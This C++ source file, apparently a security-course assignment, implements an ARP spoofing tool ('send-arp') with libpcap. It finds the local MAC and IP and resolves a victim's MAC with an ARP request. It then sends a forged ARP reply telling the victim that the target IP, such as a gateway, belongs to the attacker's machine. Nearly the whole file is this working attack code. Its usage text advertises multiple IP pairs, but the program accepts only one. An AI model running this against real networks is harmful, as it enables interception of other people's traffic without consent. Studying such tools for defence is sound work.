#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "getPacket.cpp"


void usage() {
    printf("syntax: send-arp <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}


int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}	

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket myPacket;

	myPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 1 : broadcast 2 : sender mac
	// myPacket.eth_.smac_ = Mac(); -> config after getMyMac()
	myPacket.eth_.type_ = htons(EthHdr::Arp);

	myPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	myPacket.arp_.pro_ = htons(EthHdr::Ip4);
	myPacket.arp_.hln_ = Mac::SIZE;
	myPacket.arp_.pln_ = Ip::SIZE;
	myPacket.arp_.op_ = htons(ArpHdr::Request);  
	// myPacket.arp_.smac_ = Mac("00:00:00:00:00:00"); -> after getMyMac() 
	// myPacket.arp_.sip_ = htonl(Ip("0.0.0.0"));  -> after getMyIp()
	myPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
	myPacket.arp_.tip_ = htonl(Ip(argv[2]));

    // Get network information
    if(getMyMac(dev, myPacket) == -1 || getMyIp(dev, myPacket) == -1) {
        return -1;
    }

    // Get MAC address of sender
    if (!getSenderMac(handle, myPacket)) {
        printf("Failed to get sender MAC address.\n");
        return -1;
    }

    // ARP spoof target
    myPacket.arp_.sip_ = htonl(Ip(argv[3]));
    myPacket.arp_.op_ = htons(ArpHdr::Reply);
	
    if (!sendArpSpoof(handle, myPacket)) {
        printf("Failed to send ARP spoofing packet.\n");
        return -1;
    }


	printf("Spoofed ARP of target %s.\n", argv[3]);

	pcap_close(handle);
}
